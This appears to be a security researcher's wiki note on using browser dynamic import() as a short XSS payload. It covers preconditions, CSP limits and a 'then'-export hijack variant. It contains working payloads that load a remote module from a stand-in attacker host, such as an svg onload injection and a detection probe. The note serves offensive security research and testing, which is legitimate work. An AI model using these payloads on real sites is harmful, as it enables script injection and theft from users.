---
title: Dynamic import() in browser as short XSS payload
slug: dynamic-import-xss-gadget
created_utc: 2026-05-14T00:00:00Z
updated_utc: 2026-05-14T00:00:00Z
tags: [technique/dom-xss, technique/payload-shortening, technique/csp-bypass]
inbound: []
---

# Dynamic import() as XSS payload

## Pattern

ECMAScript dynamic `import()` works in the browser (not just Node) -- it
pulls a remote ES module and runs its top-level code. Useful when:

- The XSS sink has a small length budget (`<svg/onload=import('//x.tld/a')>`
  is ~30 chars).
- The DOM has already finished parsing so `<script src>` injection is too
  late.
- A more permissive `script-src` directive blocks classic `<script src>`
  but allows the host as a module source.

Hidden second-order: the MDN docs warn against exporting a function named
`then` because dynamic `import()` returns a thenable. If attacker can
write a file that gets imported and define a `then` export, the `then`
runs implicitly during the import -- equivalent to a deserialization-style
implicit-method invocation.

## Preconditions

- Browser context with ES module support (all modern browsers).
- XSS sink that can execute JS (any `on*=`, `<script>`, eval-like sink).
- CSP `script-src` allows the module host (or no CSP / `unsafe-inline`).

## Detection

- Length-limited XSS sink -- try `import('//attacker.tld/p.js')`.
- Check CSP `script-src` for hostable third-party paths (`*.googleapis.com`
  etc.) to find module-loadable origins.

## Triggering

```html
<svg/onload=import('//attacker/p.js')>
```

Then-hijack variant (rare):
```js
// attacker.com/p.js -- file you can write to a target's static-asset sink
export const then = (resolve) => { eval('alert(1)'); };
// later, when target does `import('/uploads/your-file.js')`, then() fires.
```

## Bypasses

- Still subject to CSP `script-src` -- not a universal CSP bypass.
- Module re-import is cached per session; second `import()` with same URL
  is a no-op (use cache-busting query string for re-fires).

## Related

- [[jsonp-callback-csp-bypass]]
- [[base-tag-anywhere]]
- [[event-handler-matrix]]

## Seen in the wild

- {date: 2023-07-06, source: CT Ep 26} -- "I learned about this originally
  from file descriptor ... it saved my butt a couple times because if you
  have a length limit on your input you can still pull in long-form JS."

## References

- Critical Thinking Podcast Ep 26
- MDN -- dynamic import (warning re: `then` export)
- Garreth Heyes -- JavaScript for Hackers (length-limited payloads chapter)
